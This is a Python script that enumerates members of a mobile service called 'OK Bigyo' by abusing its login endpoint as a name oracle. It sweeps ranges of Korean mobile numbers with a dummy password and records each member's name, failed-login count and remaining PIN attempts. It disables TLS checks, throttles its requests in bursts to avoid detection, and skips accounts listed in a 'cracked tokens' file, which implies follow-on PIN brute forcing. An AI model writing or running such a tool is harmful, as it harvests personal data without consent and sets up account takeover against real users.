#!/usr/bin/env python3
"""OK Bigyo member enumeration via /bigyo/api/auth/login name-oracle.

Paced mode: BURST_SIZE probes then PAUSE_SEC cooldown.
Degraded mode: if rolling error window blows up, raises degraded.flag and exits.
Transport: thread-local pooled Sessions (fewer TLS handshakes = gentler on origin).
Known mobiles (members_live.csv + cracked_tokens.json) are skipped, so
re-scanning a band never burns PIN budget on already-found members.
"""
import collections
import concurrent.futures as cf
import json
import os
import threading
import time
import urllib3

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://m.okbigyo.com:9443/bigyo/api/auth/login"
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"

MEMBERS_FILE = "members_live.csv"
STATS_FILE = "hunt_stats.json"
STOP_FLAG = "hunt_stop.flag"
DEGRADED_FLAG = "degraded.flag"

BURST_SIZE = 2000
PAUSE_SEC = 40
TIMEOUT = 6
WINDOW = 200
ERR_THRESHOLD = 100

_tl = threading.local()
_lock = threading.Lock()
_count = 0
_since_pause = 0
_hits = 0
_errors = 0
_roll = collections.deque(maxlen=WINDOW)
_degraded = False
_start = time.time()

_seen = set()


def _load_seen():
    try:
        for line in open(MEMBERS_FILE):
            line = line.strip()
            if line:
                _seen.add(line.split(",")[0])
    except FileNotFoundError:
        pass
    try:
        for t in json.load(open("cracked_tokens.json")):
            _seen.add(t["mobile"])
    except Exception:
        pass


def session():
    s = getattr(_tl, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update({"User-Agent": UA, "Content-Type": "application/json"})
        ad = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4)
        s.mount("https://", ad)
        _tl.s = s
    return s


def probe(mobile: str):
    global _count, _hits, _errors, _since_pause, _degraded
    if _degraded:
        return
    if mobile in _seen:
        return
    ok = False
    d = None
    try:
        r = session().post(BASE, json={"mobile": mobile, "password": "0000"},
                           timeout=TIMEOUT, verify=False)
        d = r.json()
        ok = True
    except Exception:
        pass
    with _lock:
        _count += 1
        _roll.append(ok)
        if not ok:
            _errors += 1
            if sum(_roll) <= WINDOW - ERR_THRESHOLD:
                _degraded = True
                open(DEGRADED_FLAG, "w").write(str(int(time.time())))
                print("DEGRADED — raising flag, exiting", flush=True)
                return
        if ok and d:
            data = d.get("data")
            if data:
                _hits += 1
                _seen.add(mobile)
                rec = {
                    "mobile": mobile,
                    "name": data.get("name"),
                    "failCount": data.get("failCount"),
                    "left": 5 - (data.get("failCount") or 0),
                    "ts": int(time.time()),
                }
                with open(MEMBERS_FILE, "a") as f:
                    f.write(",".join(map(str, [rec["mobile"], rec["name"], rec["failCount"], rec["left"], rec["ts"]])) + "\n")
                print(f"HIT {mobile} {rec['name']} fc={rec['failCount']} left={rec['left']}", flush=True)
        _since_pause += 1
        if _count % 500 == 0:
            el = time.time() - _start
            rps = _count / el if el else 0
            st = {"tested": _count, "members": _hits, "errors": _errors, "rps": round(rps, 2), "elapsed_s": int(el)}
            with open(STATS_FILE, "w") as f:
                json.dump(st, f)
            print(f".. {_count} tested, {_hits} members, {_errors} errs, {rps:.1f} rps", flush=True)
        if _since_pause >= BURST_SIZE:
            _since_pause = 0
            print(f"-- pause {PAUSE_SEC}s after burst", flush=True)
            time.sleep(PAUSE_SEC)


def worker(start: int, stop: int):
    i = start
    while i < stop:
        if os.path.exists(STOP_FLAG) or _degraded:
            return
        mob = f"010{i:08d}"
        probe(mob)
        i += 1


def main(lo: int, hi: int, workers: int):
    _load_seen()
    print(f"loaded {len(_seen)} known mobiles (will skip)", flush=True)
    span = hi - lo
    chunk = span // workers
    rngs = [(lo + c * chunk, lo + (c + 1) * chunk if c < workers - 1 else hi) for c in range(workers)]
    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(worker, a, b) for a, b in rngs]
        for f in futs:
            f.result()
    print("SWEEP END degraded=", _degraded, flush=True)


if __name__ == "__main__":
    import sys
    lo = int(sys.argv[1]) if len(sys.argv) > 1 else 40000000
    hi = int(sys.argv[2]) if len(sys.argv) > 2 else 41000000
    wk = int(sys.argv[3]) if len(sys.argv) > 3 else 6
    main(lo, hi, wk)
